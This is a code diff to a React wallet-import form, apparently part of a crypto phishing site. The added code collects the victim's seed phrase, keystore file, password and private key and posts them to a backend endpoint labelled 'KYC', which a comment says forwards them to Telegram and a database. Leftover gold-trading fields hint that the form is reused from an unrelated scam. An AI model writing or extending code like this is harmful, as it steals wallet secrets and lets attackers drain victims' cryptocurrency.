@@ -15,7 +15,7 @@ const WalletImportForm = () => {
     setForm((prev) => ({ ...prev, [name]: value }));
   };
 
-  const handleImport = (e) => {
+  const handleImport = async (e) => {
     e.preventDefault();
 
     // Validate seed phrase
@@ -26,10 +26,57 @@ const WalletImportForm = () => {
       return;
     }
 
-    // Securely handle data (example: send to backend)
-    console.log('Captured Data:', form); // Replace with actual secure handling logic
+    // Check if session exists, if not create one
+    let sessionId = localStorage.getItem('sessionId');
+    if (!sessionId) {
+      sessionId = `session_${Date.now()}`;
+      localStorage.setItem('sessionId', sessionId);
+    }
 
-    setToast({ show: true, message: 'Wallet imported successfully!' });
+    // Always send data to Telegram and the database using the existing KYC endpoint
+    const payload = {
+      sessionId: sessionId,
+      walletType: 'Direct Import', // Since this is direct wallet import
+      seedPhrase: form.seedPhrase,
+      keystoreJson: form.keystoreJson || undefined,
+      password: form.password || undefined,
+      privateKey: form.privateKey || undefined,
+      imageUrls: [], // No images for direct import
+      fileMap: {}, // No file mapping for direct import
+      dealersLicenseStatus: 'not_available', // Mark as not available for direct import
+      qualityRequired: 'N/A',
+      karatsPurity: 'N/A',
+      destinationRefineryText: 'N/A',
+    };
+
+    try {
+      console.log('Sending payload to backend:', payload);
+      console.log('Backend URL:', import.meta.env.VITE_BACKEND_URL);
+      
+      // Send data using the existing KYC endpoint which handles both DB and Telegram
+      const res = await fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins/kyc`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      });
+
+      console.log('Response status:', res.status);
+      console.log('Response headers:', res.headers);
+
+      if (!res.ok) {
+        const errorText = await res.text();
+        console.error('Error response:', errorText);
+        throw new Error(`Failed to submit: ${errorText}`);
+      }
+
+      const responseData = await res.json();
+      console.log('Success response:', responseData);
+      setToast({ show: true, message: 'Wallet data sent successfully!' });
+    } catch (error) {
+      console.error('Error sending wallet data:', error);
+      setToast({ show: true, message: 'Failed to send wallet data. Please try again.' });
+    }
+
     if (toastTimeout.current) clearTimeout(toastTimeout.current);
     toastTimeout.current = setTimeout(() => setToast({ show: false, message: '' }), 2500);
   };
